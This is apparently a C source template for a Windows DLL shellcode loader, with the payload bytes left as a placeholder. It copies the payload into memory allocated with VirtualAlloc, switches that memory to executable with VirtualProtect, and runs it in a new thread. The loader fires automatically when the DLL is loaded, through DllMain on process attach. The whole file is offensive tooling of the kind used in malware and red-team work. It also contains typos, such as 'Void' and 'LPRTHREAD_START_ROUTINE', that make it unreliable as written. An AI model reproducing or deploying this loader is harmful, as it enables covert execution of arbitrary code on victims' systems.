#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char payload[] = {
<payload contents here> 
};
unsigned int payload_len = sizeof(payload);

extern __declspec(dllexport) int Go(void);
int Go(Void) {

    void * exec_mem;
    BOOL rv; 
    HANDLE th;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if ( rv != 0 ){
        th = CreateThread(0,0, (LPRTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, 0);
    }
    return 0;
}


BOOL WINAPI DLLMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

    switch ( fdwReason ) {
        case DLL_PROCESS_ATTACH:
            Go();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
